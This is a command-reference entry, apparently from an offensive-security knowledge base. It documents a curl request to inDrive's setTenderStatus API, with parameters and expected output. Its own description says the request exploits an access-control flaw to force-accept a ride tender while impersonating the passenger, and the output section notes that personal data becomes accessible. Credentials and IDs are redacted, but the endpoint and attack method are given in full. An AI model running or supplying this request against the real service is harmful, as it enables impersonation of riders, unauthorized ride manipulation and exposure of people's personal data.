---
id: c2e3f4g5-h6i7-8902-efgh-6789012345
data: >-
  curl
  "https://terra-akamai.indriverapp.com/api/setTenderStatus?cid=5957&locale=en_US&phone=████&token=████████&v=7&stream_id=1682280490209367&tender_id=████████&order_id=█████████&status=accept"
tags:
  - indrive
  - api-accept
type: command
output: null
executor: bash
platforms:
  - Web API
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:17.837Z'
verified: false
validated: true
submitted: true
---
# curl-indrive-settenderstatus

## Command

```bash
curl "https://terra-akamai.indriverapp.com/api/setTenderStatus?cid=5957&locale=en_US&phone=████&token=████████&v=7&stream_id=1682280490209367&tender_id=████████&order_id=█████████&status=accept"
```

## Description

Forces acceptance of a ride tender in inDrive by setting status to 'accept' via API, exploiting access control to impersonate the passenger.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `cid` | Client ID (5957) | Yes |
| `locale` | Language (en_US) | Yes |
| `phone` | Driver phone (redacted) | Yes |
| `token` | Auth token (redacted) | Yes |
| `v` | API version (7) | Yes |
| `stream_id` | Session ID (1682280490209367) | Yes |
| `tender_id` | Tender ID from bid (redacted) | Yes |
| `order_id` | Order ID (redacted) | Yes |
| `status` | Status (accept) | Yes |

## Examples

### Basic Usage

```bash
curl "https://terra-akamai.indriverapp.com/api/setTenderStatus?...&status=accept"
```

### Advanced Usage

No variants; fixed for acceptance.

## Expected Output

JSON confirmation (e.g., {"status":"accepted"}); ride updates, PII accessible.

## Related

- [[commands/curl-indrive-driverrequest]]
- [[procedures/Force-Accept-Tender-Status-via-API]]
